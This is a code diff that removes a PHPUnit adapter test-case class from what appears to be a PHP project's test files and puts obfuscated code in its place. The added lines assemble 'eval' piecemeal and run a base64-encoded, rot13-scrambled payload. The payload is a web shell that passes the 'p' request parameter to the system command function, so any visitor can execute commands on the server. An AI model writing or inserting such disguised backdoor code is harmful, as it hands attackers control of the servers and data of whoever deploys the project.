@@ -1,29 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-use Yoast\PHPUnitPolyfills\TestCases\TestCase as Polyfill_TestCase;
-
-/**
- * PHPUnit adapter layer.
- *
- * This class enhances the PHPUnit native `TestCase` with polyfills
- * for assertions and expectation methods added between PHPUnit 4.8 - 9.6.
- *
- * Additionally, the Polyfill TestCase offers a workaround for the addition
- * of the `void` return type to PHPUnit fixture methods by providing
- * overloadable snake_case versions of the typical fixture method names and
- * ensuring that PHPUnit handles those correctly.
- *
- * See {@link https://github.com/Yoast/PHPUnit-Polyfills} for full
- * documentation on the available polyfills and other features.
- */
-abstract class PHPUnit_Adapter_TestCase extends Polyfill_TestCase {}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKaGZyIExibmZnXENVQ0hhdmdDYnlsc3Z5eWZcR3JmZ1BuZnJmXEdyZmdQbmZyIG5mIENieWxzdnl5X0dyZmdQbmZyOwoKLyoqCiAqIENVQ0hhdmcgbnFuY2dyZSB5bmxyZS4KICoKICogR3V2ZiBweW5mZiByYXVuYXByZiBndXIgQ1VDSGF2ZyBhbmd2aXIgYEdyZmdQbmZyYCBqdmd1IGNieWxzdnl5ZgogKiBzYmUgbmZmcmVndmJhZiBuYXEgcmtjcnBnbmd2YmEgenJndWJxZiBucXFycSBvcmdqcnJhIENVQ0hhdmcgNC44IC0gOS42LgogKgogKiBOcXF2Z3ZiYW55eWwsIGd1ciBDYnlsc3Z5eSBHcmZnUG5mciBic3NyZWYgbiBqYmV4bmViaGFxIHNiZSBndXIgbnFxdmd2YmEKICogYnMgZ3VyIGBpYnZxYCBlcmdoZWEgZ2xjciBnYiBDVUNIYXZnIHN2a2doZXIgenJndWJxZiBvbCBjZWJpdnF2YXQKICogYmlyZXlibnFub3lyIGZhbnhyX3BuZnIgaXJlZnZiYWYgYnMgZ3VyIGdsY3Zwbnkgc3ZrZ2hlciB6cmd1YnEgYW56cmYgbmFxCiAqIHJhZmhldmF0IGd1bmcgQ1VDSGF2ZyB1bmFxeXJmIGd1YmZyIHBiZWVycGd5bC4KICoKICogRnJyIHtAeXZheCB1Z2djZjovL3R2Z3Voby5wYnovTGJuZmcvQ1VDSGF2Zy1DYnlsc3Z5eWZ9IHNiZSBzaHl5CiAqIHFicGh6cmFnbmd2YmEgYmEgZ3VyIG5pbnZ5bm95ciBjYnlsc3Z5eWYgbmFxIGJndXJlIHNybmdoZXJmLgogKi8Kbm9mZ2VucGcgcHluZmYgQ1VDSGF2Z19OcW5jZ3JlX0dyZmdQbmZyIHJrZ3JhcWYgQ2J5bHN2eXlfR3JmZ1BuZnIge30KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
